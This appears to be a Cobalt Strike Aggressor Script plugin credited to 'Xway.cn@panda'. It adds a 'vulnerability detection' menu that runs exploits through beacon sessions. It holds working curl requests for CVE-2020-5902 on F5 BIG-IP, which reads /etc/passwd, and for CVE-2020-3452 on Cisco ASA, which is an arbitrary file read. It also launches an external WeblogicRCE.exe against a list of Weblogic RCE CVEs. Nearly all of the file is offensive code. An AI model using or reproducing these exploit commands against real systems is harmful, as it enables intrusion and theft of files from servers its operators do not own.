##############################
#                            #
#                            #
#                            #
#       Xway.cn@panda        #
#                            #
#                            #
#                            #
##############################
menu "漏洞探测" {
                item "BIG-IP(CVE-2020-5902)"{
                    $bid = $1['@'];
                    $Dialog = dialog("BIG-IP",%(ip => "https://127.0.0.1",bid => $bid),&bigip);
                    dialog_description($Dialog, "BIG-IP RCE(CVE-2020-5902),仅进行漏洞探测，默认读取/etc/passwd文件。");
                    drow_text($Dialog, "ip", "URL: ");
                    dbutton_action($Dialog, "运行");
                    dialog_show($Dialog);
                }

sub bigip{
    local('$Name');
    $Name = $3['ip'];
	bshell($bid, "curl -v -k  $+ $Name\/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd");
}

                item "CISCO ASA(CVE-2020-3452)"{
                    $bid = $1['@'];
                    $Dialog = dialog("CISCO ASA",%(ip => "https://127.0.0.1",bid => $bid),&CISCO);
                    dialog_description($Dialog, "CISCO ASA(CVE-2020-3452),远程任意文件读取，仅进行漏洞探测，默认读取\"/+CSCOE+/portal_inc.lua\"文件。");
                    drow_text($Dialog, "ip", "URL: ");
                    dbutton_action($Dialog, "运行");
                    dialog_show($Dialog);
                }
sub CISCO{
    local('$Name');
    $Name = $3['ip'];
	bshell($bid, "curl -v -k  $+ $Name\/+CSCOT+/translation-table?type=mst\"&\"textdomain=/%2bCSCOE%2b/portal_inc.lua\"&\"default-language\"&\"lang=../");
}



			item "Weblogic" {
			$bid = $1['@'];
			$dialog = dialog("Weblogic", %(ip => "192.168.1.1",port => "7001",bid => $bid), &Weblogic);
			dialog_description($dialog, "CVE-2016-0638,CVE-2016-3510,CVE-2017-3248,CVE-2017-10271,CVE-2018-2628,CVE-2018-2893,CVE-2019-2725");
			drow_combobox($dialog, "type", "type:", @("-check"));
			drow_text($dialog, "ip", "ip:  ");	
			drow_text($dialog, "port", "port:  ");			
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Weblogic {
	$arg = join(' ',  @($3['type'],$3['ip'],$3['port']));
	bexecute_assembly($bid, script_resource("/script/WeblogicRCE.exe"), $arg);
}
			}
			
        
